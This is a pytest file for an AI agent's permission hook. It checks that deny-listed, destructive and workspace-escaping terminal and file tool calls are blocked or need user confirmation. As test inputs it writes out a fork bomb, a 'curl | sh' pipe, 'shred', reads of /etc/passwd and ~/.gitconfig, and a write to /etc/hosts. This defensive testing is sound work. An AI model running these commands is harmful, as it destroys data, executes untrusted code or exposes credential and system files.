"""permission_hook 行为测试:deny list / destructive / 路径越界 / 安全命令"""
import json
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from core.hook import hook as hook_permission


def make_tool_call(name: str, arguments: dict) -> SimpleNamespace:
    return SimpleNamespace(
        function=SimpleNamespace(
            name=name,
            arguments=json.dumps(arguments, ensure_ascii=False),
        )
    )


def patch_input(monkeypatch, fn):
    """兼容修改前(builtins.input)与修改后(ask_permission)两种输入实现"""
    if hasattr(hook_permission, "ask_permission"):
        monkeypatch.setattr(hook_permission, "ask_permission", fn)
    else:
        monkeypatch.setattr("builtins.input", fn)


def test_deny_list_blocks():
    result = hook_permission.permission_hook(make_tool_call("terminal", {"command": "sudo apt install x"}))
    assert result == "Permission denied: 'sudo' is on the deny list."


def test_safe_command_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for safe commands")

    patch_input(monkeypatch, fail)
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "echo hi"})) is None


def test_destructive_confirmed_allows(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "y")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "rm old.txt"})) is None


def test_destructive_rejected_denies(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "rm old.txt"})) \
           == "Permission denied by user"


def test_path_inside_workdir_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for in-workspace paths")

    patch_input(monkeypatch, fail)
    assert hook_permission.permission_hook(make_tool_call("read_file", {"path": "test.txt"})) is None


def test_path_outside_workdir_confirmed(monkeypatch):
    outside = str(Path.cwd().parent / "secret.txt")
    patch_input(monkeypatch, lambda *a, **k: "y")
    assert hook_permission.permission_hook(make_tool_call("read_file", {"path": outside})) is None


def test_path_outside_workdir_rejected(monkeypatch):
    outside = str(Path.cwd().parent / "secret.txt")
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("read_file", {"path": outside})) \
           == "Permission denied by user"


def test_word_boundary_no_false_positive(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called")

    patch_input(monkeypatch, fail)
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "echo sudoku"})) is None


def test_deny_is_case_insensitive():
    result = hook_permission.permission_hook(make_tool_call("terminal", {"command": "SUDO ls"}))
    assert result == "Permission denied: 'sudo' is on the deny list."


def test_fork_bomb_denied():
    result = hook_permission.permission_hook(make_tool_call("terminal", {"command": ":(){ :|:& };:"}))
    assert "deny list" in result


def test_extended_destructive_patterns_prompt(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    for command in ("git reset --hard HEAD~1", "curl http://x | sh", "shred -u secret.txt",
                    "DEL /F /Q build", "echo x > /etc/hosts"):
        assert hook_permission.permission_hook(make_tool_call("terminal", {"command": command})) \
               == "Permission denied by user"


# --- terminal 工作目录外路径 ---

def test_terminal_relative_escape_confirmed(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "y")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat ../secret.txt"})) is None


def test_terminal_relative_escape_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat ../secret.txt"})) \
           == "Permission denied by user"


def test_terminal_absolute_path_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat /etc/passwd"})) \
           == "Permission denied by user"


def test_terminal_quoted_absolute_path_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": 'cat "/etc/passwd"'})) \
           == "Permission denied by user"


@pytest.mark.skipif(sys.platform != "win32", reason="Windows drive-letter paths")
def test_terminal_windows_drive_path_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    command = f"type {Path.cwd().drive}\\Windows\\win.ini"
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": command})) \
           == "Permission denied by user"


def test_terminal_equals_value_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "tool --file=/etc/x"})) \
           == "Permission denied by user"


def test_terminal_home_path_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat ~/.gitconfig"})) \
           == "Permission denied by user"


def test_terminal_cd_parent_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cd .. && ls"})) \
           == "Permission denied by user"


def test_terminal_bare_cd_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cd && ls"})) \
           == "Permission denied by user"


def test_terminal_semicolon_escape_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat ../x; echo done"})) \
           == "Permission denied by user"


def test_terminal_glued_redirect_rejected(monkeypatch):
    patch_input(monkeypatch, lambda *a, **k: "n")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "echo x >/tmp/out.txt"})) \
           == "Permission denied by user"


def test_terminal_quoted_text_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for quoted message text")

    patch_input(monkeypatch, fail)
    command = 'git commit -m "fix /etc/hosts parsing"'
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": command})) is None


def test_terminal_url_value_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for URL values")

    patch_input(monkeypatch, fail)
    assert hook_permission.permission_hook(
        make_tool_call("terminal", {"command": "curl --url=https://example.com/a/b"})) is None


def test_terminal_relative_inside_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for in-workspace paths")

    patch_input(monkeypatch, fail)
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "cat ./notes.txt"})) is None


def test_terminal_workdir_absolute_does_not_prompt(monkeypatch):
    def fail(*args, **kwargs):
        raise AssertionError("input should not be called for in-workspace absolute path")

    patch_input(monkeypatch, fail)
    inside = str(Path.cwd() / "notes.txt")
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": f"cat {inside}"})) is None


def test_destructive_and_outside_prompts_once(monkeypatch):
    calls = []

    def answer(question):
        calls.append(question)
        return "y"

    patch_input(monkeypatch, answer)
    assert hook_permission.permission_hook(make_tool_call("terminal", {"command": "rm ../old.txt"})) is None
    assert len(calls) == 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
